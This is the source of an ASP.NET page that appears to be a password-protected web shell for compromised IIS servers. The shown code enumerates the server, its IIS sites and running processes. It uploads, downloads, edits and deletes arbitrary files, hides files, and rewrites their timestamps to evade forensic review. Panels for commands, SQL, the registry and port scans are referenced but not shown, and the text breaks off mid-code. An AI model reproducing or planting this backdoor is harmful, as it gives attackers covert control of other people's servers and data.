<%@ Page Language="C#" Debug="true" trace="false" validateRequest="false"  %>
<%@ import Namespace="System.IO" %>
<%@ import Namespace="System.Diagnostics" %>
<%@ import Namespace="System.Data" %>
<%@ import Namespace="System.Data.OleDb" %>
<%@ import Namespace="Microsoft.Win32" %>
<%@ import Namespace="System.Net.Sockets" %>
<%@ Assembly Name="System.DirectoryServices, Version=2.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A" %>
<%@ import Namespace="System.DirectoryServices" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<script runat="server">
/* 

*/
    public string Password = "d626c1a6cf947e4a883cbeb7d767acd5";
    public string SessionName = "L";
    public string Bin_Action = "";
    public string Bin_Request = "";
    protected OleDbConnection conn = new OleDbConnection();
    protected OleDbCommand comm = new OleDbCommand();
    
    protected void Page_Load(object sender, EventArgs e)
    {
        
        if (Session[SessionName] != "BIN")
        {
            Bin_login();
        }
        else
        {
            if (!IsPostBack)
            {
                Bin_main();
            }
            else 
            {
              
                  Bin_Action = Request["goaction"];
              if (Bin_Action == "del")
              {
                  Bin_Request = Request["todo"];
                  Bin_Filedel(Bin_Request, 1);
              }
              if (Bin_Action == "change") 
              {
                  Bin_Request = Request["todo"];
                  Bin_FileList(Bin_Request);
              }
              if (Bin_Action == "deldir")
              {
                  Bin_Request = Request["todo"];
                  Bin_Filedel(Bin_Request, 2);
              }
              if (Bin_Action == "down")
              {
                  Bin_Request = Request["todo"];
                  Bin_Filedown(Bin_Request);
              }
              if (Bin_Action == "rename")
              {
                  Bin_Request = Request["todo"];
                  Bin_FileRN(Bin_Request, 1);
              }
              if (Bin_Action == "renamedir")
              {
                  Bin_Request = Request["todo"];
                  Bin_FileRN(Bin_Request, 2);
              }
              if (Bin_Action == "showatt")
              {
                  Bin_Request = Request["todo"];
                  Bin_Fileatt(Bin_Request);
              }
              if (Bin_Action == "edit")
              {
                  Bin_Request = Request["todo"];
                  Bin_FileEdit(Bin_Request);
              }
              if (Bin_Action == "postdata")
              {
                  
                  Bin_Request = Request["todo"];
                  Session["Bin_Table"] = Bin_Request;
                  Bin_DataGrid.CurrentPageIndex = 0;
                  Bin_DBstrTextBox.Text = "";
                  Bin_Databind();
              }
              if (Bin_Action == "changedata")
              {
                  Session["Bin_Table"] = null;
                  Bin_Request = Request["todo"];
                  Session["Bin_Option"] = Request["intext"];
                  Bin_Change();
                  Bin_DBinfoLabel.Visible = false;
                  Bin_DBstrTextBox.Text = Bin_Request;
                  
              }
              if (Session["Bin_Table"] != null)
              {
                  Bin_Databind();
              }
                  
            } 
        }
    }
    public void Bin_login() 
    {
        Bin_LoginPanel.Visible = true;
        Bin_MainPanel.Visible = false;
        Bin_MenuPanel.Visible = false;
        Bin_FilePanel.Visible = false;
        Bin_CmdPanel.Visible = false;
        Bin_SQLPanel.Visible = false;
        Bin_SuPanel.Visible = false;
        Bin_IISPanel.Visible = false;
        Bin_PortPanel.Visible = false;
        Bin_RegPanel.Visible = false;
    }
    public void Bin_main()
    {
        TimeLabel.Text = DateTime.Now.ToString();
        Bin_PortPanel.Visible = false;
        Bin_RegPanel.Visible = false;
        Bin_LoginPanel.Visible = false;
        Bin_MainPanel.Visible = true;
        Bin_MenuPanel.Visible = true;
        Bin_FilePanel.Visible = false;
        Bin_CmdPanel.Visible = false;
        Bin_SQLPanel.Visible = false;
        Bin_SuPanel.Visible = false;
        Bin_IISPanel.Visible = false;
        string ServerIP = "Server IP : "+Request.ServerVariables["LOCAL_ADDR"]+"<br>";
        string HostName = "HostName : " + Environment.MachineName + "<br>";
        string OS = "OS Version : " + Environment.OSVersion + "</br>";
        string IISversion = "IIS Version : " + Request.ServerVariables["SERVER_SOFTWARE"] + "<br>";
        string PATH_INFO = "PATH_TRANSLATED : " + Request.ServerVariables["PATH_TRANSLATED"] + "<br>";
        InfoLabel.Text = "<hr><center><b><U>SYS-INFO</U></B></center>";
        InfoLabel.Text += ServerIP + HostName + OS + IISversion + PATH_INFO + "<hr>";
        InfoLabel.Text += Bin_Process() + "<hr>";
        
    }
    private bool CheckIsNumber(string sSrc)
    {
        System.Text.RegularExpressions.Regex reg = new System.Text.RegularExpressions.Regex(@"^0|[0-9]*[1-9][0-9]*$");

        if (reg.IsMatch(sSrc))
        {
            return true;
        }
        else
        {
            return false;
        }
    }
    public string Bin_iisinfo() 
    {
        string iisinfo = "";
        string iisstart = "";
        string iisend = "";
        string iisstr = "IIS://localhost/W3SVC";
        int i = 0;
        try
        {
            DirectoryEntry mydir = new DirectoryEntry(iisstr);
            iisstart = "<input type=hidden name=goaction><input type=hidden name=todo><TABLE width=100% align=center border=0><TR align=center><TD width=6%><B>Order</B></TD><TD width=20%><B>IIS_USER</B></TD><TD width=25%><B>Domain</B></TD><TD width=30%><B>Path</B></TD></TR>";
            foreach (DirectoryEntry child in mydir.Children)
            {
                if (CheckIsNumber(child.Name.ToString()))
                {
                    string dirstr = child.Name.ToString();
                    string tmpstr = "";
                    DirectoryEntry newdir = new DirectoryEntry(iisstr + "/" + dirstr);
                    DirectoryEntry newdir1 = newdir.Children.Find("root", "IIsWebVirtualDir");
                    iisinfo += "<TR><TD align=center>" + (i = i + 1) + "</TD>";
                    iisinfo += "<TD align=center>" + newdir1.Properties["AnonymousUserName"].Value + "</TD>";
                    iisinfo += "<TD>" + child.Properties["ServerBindings"][0] + "</TD>";
                    iisinfo += "<TD><a href=javascript:Command('change','" + formatpath(newdir1.Properties["Path"].Value.ToString()) + "');>" + newdir1.Properties["Path"].Value + "</a></TD>";
                    iisinfo += "</TR>";
                }
            }
            iisend = "</TABLE><hr>";
        }
        catch (Exception error)
        {
            Bin_Error(error.Message);
        }
          return iisstart + iisinfo + iisend;
    }
    public string Bin_Process()
    {
        string htmlstr = "<center><b><U>PROCESS-INFO</U></B></center><TABLE width=80% align=center border=0><TR align=center><TD width=20%><B>ID</B></TD><TD align=left width=20%><B>Process</B></TD><TD align=left width=20%><B>MemorySize</B></TD><TD align=center width=10%><B>Threads</B></TD></TR>";
            string prostr = "";
            string htmlend = "</TR></TABLE>";
            try
            {
                Process[] myprocess = Process.GetProcesses();
                foreach (Process p in myprocess)
                {
                    prostr += "<TR><TD align=center>" + p.Id.ToString() + "</TD>";
                    prostr += "<TD align=left>" + p.ProcessName.ToString() + "</TD>";
                    prostr += "<TD align=left>" + p.WorkingSet.ToString() + "</TD>";
                    prostr += "<TD align=center>" + p.Threads.Count.ToString() + "</TD>";
                }
            }
            catch (Exception Error)
            {
                Bin_Error(Error.Message);
            }
        return htmlstr + prostr + htmlend;
    }
    protected void LoginButton_Click(object sender, EventArgs e)
    {
        string MD5Pass = FormsAuthentication.HashPasswordForStoringInConfigFile(passtext.Text,"MD5").ToLower();
        if (MD5Pass == Password)
        {
            Session[SessionName] = "BIN";
            Bin_main();
        }
        else
        {
            Bin_login();
        } 
    }

    protected void LogoutButton_Click(object sender, EventArgs e)
    {
        Session.Abandon();
        Bin_login();
    }

    protected void FileButton_Click(object sender, EventArgs e)
    {
        Bin_LoginPanel.Visible = false;
        Bin_MenuPanel.Visible = true;
        Bin_MainPanel.Visible = false;
        Bin_FilePanel.Visible = true;
        Bin_CmdPanel.Visible = false;
        Bin_SQLPanel.Visible = false;
        Bin_SuPanel.Visible = false;
        Bin_IISPanel.Visible = false;
        Bin_PortPanel.Visible = false;
        Bin_RegPanel.Visible = false;
        Bin_upTextBox.Text = formatpath(Server.MapPath("."));
        Bin_CopyTextBox.Text = formatpath(Server.MapPath("."));
        Bin_upTextBox.Text = formatpath(Server.MapPath("."));
        Bin_FileList(Server.MapPath("."));
       
    }

    protected void MainButton_Click(object sender, EventArgs e)
    {
        Bin_main();
    }
    public void Bin_DriveList() 
    {
        string file = "<input type=hidden name=goaction><input type=hidden name=todo>";
        file += "<hr>Drives : ";
        string[] drivers = Directory.GetLogicalDrives();
        for (int i = 0; i < drivers.Length; i++)
        {
            file += "<a href=javascript:Command('change','" + formatpath(drivers[i]) + "');>" + drivers[i] + "</a>&nbsp;";
        }
        file += "    WebRoot :  <a href=javascript:Command('change','" + formatpath(Server.MapPath(".")) + "');>" + Server.MapPath(".") + "</a>";
        Bin_FileLabel.Text = file;
    }

    public void Bin_FileList(string Bin_path)
    {
        Bin_FilePanel.Visible = true;
        Bin_CreateTextBox.Text = "";
        Bin_CopytoTextBox.Text = "";
        Bin_CopyTextBox.Text = Bin_path;
        Bin_upTextBox.Text = Bin_path;
        Bin_IISPanel.Visible = false;
        Bin_DriveList();
        string tmpstr="";
        string Bin_Filelist = Bin_FilelistLabel.Text;
        Bin_Filelist = "<hr>";
        Bin_Filelist += "<table width=90% border=0 align=center>";
        Bin_Filelist += "<tr><td width=40%><b>Name</b></td><td width=15%><b>Size(Byte)</b></td>";
        Bin_Filelist += "<td width=25%><b>ModifyTime</b></td><td width=25%><b>Operate</b></td></tr>";
        try
        {
            Bin_Filelist += "<tr><td>";
            string parstr = "";
            if (Bin_path.Length < 4)
            {
                parstr = formatpath(Bin_path);
              
            }
            else 
            {
                parstr =  formatpath(Directory.GetParent(Bin_path).ToString());
              
            }
            Bin_Filelist += "<i><b><a href=javascript:Command('change','" + parstr + "');>|Parent Directory|</a></b></i>";
            Bin_Filelist += "</td></tr>";
            
            DirectoryInfo Bin_dir = new DirectoryInfo(Bin_path);
            foreach (DirectoryInfo Bin_folder in Bin_dir.GetDirectories())
            {
                string foldername = formatpath(Bin_path) + "/" + formatfile(Bin_folder.Name);
                tmpstr += "<tr>";
                tmpstr += "<td><a href=javascript:Command('change','" + foldername + "')>" + Bin_folder.Name + "</a></td><td><b><i>&lt;dir&gt;</i></b></td><td>" + Directory.GetLastWriteTime(Bin_path + "/" + Bin_folder.Name) + "</td><td><a href=javascript:Command('renamedir','" + foldername + "');>Ren</a>|<a href=javascript:Command('showatt','" + foldername + "/');>Att</a>|<a href=javascript:Command('deldir','" + foldername + "');>Del</a></td>";
                tmpstr += "</tr>";
            }
            foreach (FileInfo Bin_file in Bin_dir.GetFiles())
            {
                string filename = formatpath(Bin_path) + "/" + formatfile(Bin_file.Name);
                tmpstr += "<tr>";
                tmpstr += "<td>" + Bin_file.Name + "</td><td>" + Bin_file.Length + "</td><td>" + Directory.GetLastWriteTime(Bin_path + "/" + Bin_file.Name) + "</td><td><a href=javascript:Command('edit','" + filename + "');>Edit</a>|<a href=javascript:Command('rename','" + filename + "');>Ren</a>|<a href=javascript:Command('down','" + filename + "');>Down</a>|<a href=javascript:Command('showatt','" + filename + "');>Att</a>|<a href=javascript:Command('del','" + filename + "');>Del</a></td>";
                tmpstr += "</tr>";
            }
            tmpstr += "</talbe>";
        }
        catch (Exception Error)
        {
            Bin_Error(Error.Message);

        }

        Bin_FilelistLabel.Text = Bin_Filelist + tmpstr;
    }
    public void Bin_Filedel(string instr,int type)
    {
        try
        {
            if (type == 1)
            {
                File.Delete(instr);
            }
            if (type == 2)
            {
                foreach (string tmp in Directory.GetFileSystemEntries(instr))
                {
                    if (File.Exists(tmp))
                    {
                        File.Delete(tmp);
                    }
                    else
                    {
                        Bin_Filedel(tmp, 2);
                    }  
                }
                Directory.Delete(instr);  
            }
        }
        catch (Exception Error)
        {
            Bin_Error(Error.Message);
        }
        Bin_FileList(Bin_upTextBox.Text); 
    }
    public void Bin_FileRN(string instr,int type) 
    {
        try
        {
            if (type == 1)
            {
                string[] array = instr.Split(',');

                File.Move(array[0], array[1]);
            }
            if (type == 2)
            {
                string[] array = instr.Split(',');
                Directory.Move(array[0], array[1]);
            }
        }
        catch (Exception Error)
        {
            Bin_Error(Error.Message);
        }
        Bin_FileList(Bin_upTextBox.Text);
    }
    public void Bin_Filedown(string instr) 
    {
        try
        {
            FileStream MyFileStream = new FileStream(instr, FileMode.Open, FileAccess.Read, FileShare.Read);
            long FileSize = MyFileStream.Length;
            byte[] Buffer = new byte[(int)FileSize];
            MyFileStream.Read(Buffer, 0, (int)FileSize);
            MyFileStream.Close();
            Response.AddHeader("Content-Disposition", "attachment;filename=" + instr);
            Response.Charset = "UTF-8";
            Response.ContentType = "application/octet-stream";
            Response.BinaryWrite(Buffer);
            Response.Flush();
            Response.End();
        }
        catch (Exception Error)
        {
            Bin_Error(Error.Message); 
        }
        
    }
    public void Bin_Fileatt(string instr)
    {
        Bin_AttPanel.Visible = true;
        Bin_FilePanel.Visible = true;
        try
        {
            string Att = File.GetAttributes(instr).ToString();
            Bin_ReadOnlyCheckBox.Checked = false;
            Bin_SystemCheckBox.Checked = false;
            Bin_HiddenCheckBox.Checked = false;
            Bin_ArchiveCheckBox.Checked = false;

            if (Att.LastIndexOf("ReadOnly") != -1)
            {
                Bin_ReadOnlyCheckBox.Checked = true;
            }
            if (Att.LastIndexOf("System") != -1)
            {
                Bin_SystemCheckBox.Checked = true;
            }
            if (Att.LastIndexOf("Hidden") != -1)
            {
                Bin_HiddenCheckBox.Checked = true;
            }
            if (Att.LastIndexOf("Archive") != -1)
            {
                Bin_ArchiveCheckBox.Checked = true;
            }
            Bin_CreationTimeTextBox.Text = File.GetCreationTime(instr).ToString();
            Bin_LastWriteTimeTextBox.Text = File.GetLastWriteTime(instr).ToString();
            Bin_AccessTimeTextBox.Text = File.GetLastAccessTime(instr).ToString();
        }
        catch (Exception Error)
        {
            Bin_Error(Error.Message);
        }
        Bin_AttLabel.Text = instr;
        Session["FileName"] = instr;
        Bin_DriveList();
    }
    public void Bin_FileEdit(string instr)
    {
        Bin_FilePanel.Visible = true;
        Bin_EditPanel.Visible = true;
        Bin_DriveList();
        Bin_EditpathTextBox.Text = instr;
        StreamReader SR = new StreamReader(instr, Encoding.Default);
        Bin_EditTextBox.Text = SR.ReadToEnd();
        SR.Close();
    }
    protected void Bin_upButton_Click(object sender, EventArgs e)
    {
       
            string uppath = Bin_upTextBox.Text;
            if (uppath.Substring(uppath.Length - 1, 1) != @"/")
            {
                uppath = uppath + @"/";
            }
            try
            {
                Bin_UpFile.PostedFile.SaveAs(uppath + Path.GetFileName(Bin_UpFile.Value));
                
            }
            catch (Exception error)
            {
                Bin_Error(error.Message);
            }
            Bin_FileList(uppath);
    }
    public void Bin_Error(string error)
    {
        Bin_ErrorLabel.Text = "Error : " + error;
    }
    public string formatpath(string instr)
    {
        instr = instr.Replace(@"\", "/");
        if (instr.Length < 4)
        {
            instr = instr.Replace(@"/", "");
        }
        if (instr.Length == 2)
        {
            instr = instr + @"/";
        }
        instr = instr.Replace(" ", "%20");
        return instr;
    }
    public string formatfile(string instr)
    {
        instr = instr.Replace(" ", "%20");
        return instr;
      
    }
    protected void Bin_GoButton_Click(object sender, EventArgs e)
    {
        Bin_FileList(Bin_upTextBox.Text);
    }

    protected void Bin_NewFileButton_Click(object sender, EventArgs e)
    {
        string newfile = Bin_CreateTextBox.Text;
        string filepath = Bin_upTextBox.Text;
        filepath = filepath + "/" + newfile;
        try
        {
            StreamWriter sw = new StreamWriter(filepath, true, Encoding.Default);
            
        }
        catch (Exception Error)
        {
            Bin_Error(Error.Message);
        }
        Bin_FileList(Bin_upTextBox.Text);
    }

    protected void Bin_NewdirButton_Click(object sender, EventArgs e)
    {
        string dirpath = Bin_upTextBox.Text;
        string newdir = Bin_CreateTextBox.Text;
        newdir = dirpath + "/" + newdir;
        try
        {
            Directory.CreateDirectory(newdir);
           
        }
        catch(Exception Error)
        {
            Bin_Error(Error.Message);
        }
        Bin_FileList(Bin_upTextBox.Text);
    }

    protected void Bin_CopyButton_Click(object sender, EventArgs e)
    {
        string copystr = Bin_CopyTextBox.Text;
        string copyto = Bin_CopytoTextBox.Text;
        try
        {
            File.Copy(copystr, copyto);
        }
        catch (Exception Error)
        {
             Bin_Error(Error.Message);
        }
        Bin_CopytoTextBox.Text = "";
        Bin_FileList(Bin_upTextBox.Text);
    }

    protected void Bin_CutButton_Click(object sender, EventArgs e)
    {
        string copystr = Bin_CopyTextBox.Text;
        string copyto = Bin_CopytoTextBox.Text;
        try
        {
            File.Move(copystr, copyto);
        }
        catch (Exception Error)
        {
            Bin_Error(Error.Message);
        }
        Bin_CopytoTextBox.Text = "";
        Bin_FileList(Bin_upTextBox.Text);
    }

    protected void Bin_SetButton_Click(object sender, EventArgs e)
    {
        try
        {
            string FileName = Session["FileName"].ToString();
            File.SetAttributes(FileName, FileAttributes.Normal);
            if (Bin_ReadOnlyCheckBox.Checked)
            {
                File.SetAttributes(FileName, FileAttributes.ReadOnly);
            }

            if (Bin_SystemCheckBox.Checked)
            {
                File.SetAttributes(FileName, File.GetAttributes(FileName) | FileAttributes.System);
            }
            if (Bin_HiddenCheckBox.Checked)
            {
                File.SetAttributes(FileName, File.GetAttributes(FileName) | FileAttributes.Hidden);
            }
            if (Bin_ArchiveCheckBox.Checked)
            {
                File.SetAttributes(FileName, File.GetAttributes(FileName) | FileAttributes.Archive);
            }
            if (FileName.Substring(FileName.Length - 1, 1) == "/")
            {
                Directory.SetCreationTime(FileName, Convert.ToDateTime(Bin_CreationTimeTextBox.Text));
                Directory.SetLastWriteTime(FileName, Convert.ToDateTime(Bin_LastWriteTimeTextBox.Text));
                Directory.SetLastAccessTime(FileName, Convert.ToDateTime(Bin_AccessTimeTextBox.Text));
            }
            else
            {
                File.SetCreationTime(FileName, Convert.ToDateTime(Bin_CreationTimeTextBox.Text));
                File.SetLastWriteTime(FileName, Convert.ToDateTime(Bin_LastWriteTimeTextBox.Text));
                File.SetLastAccessTime(FileName, Convert.ToDateTime(Bin_AccessTimeTextBox.Text));
            }
        }
        catch (Exception Error)
        {
            Bin_Error(Error.Message);
        }
        Bin_FileList(Bin_upTextBox.Text);
        Response.Write("<script>alert('Success!')</sc" + "ript>");
    }

    protected void Bin_EditButton_Click(object sender, EventArgs e)
    {
        try
        {
            StreamWriter SW = new StreamWriter(Bin_EditpathTextBox.Text, false, Encoding.Default);
            SW.Write(Bin_EditTextBox.Text);
            SW.Close();
        }
        catch (Exception Error)
        {
            Bin_Error(Error.Message); 
        }
        Bin_FileList(Bin_upTextBox.Text);
        Response.Write("<script>alert('Success!')</sc" + "ript>");
        
    }
    
    protected void Bin_BackButton_Click(object sender, EventArgs e)
    {
        Bin_FileList(Bin_upTextBox.Text);
    }

    protected void Bin_SbackButton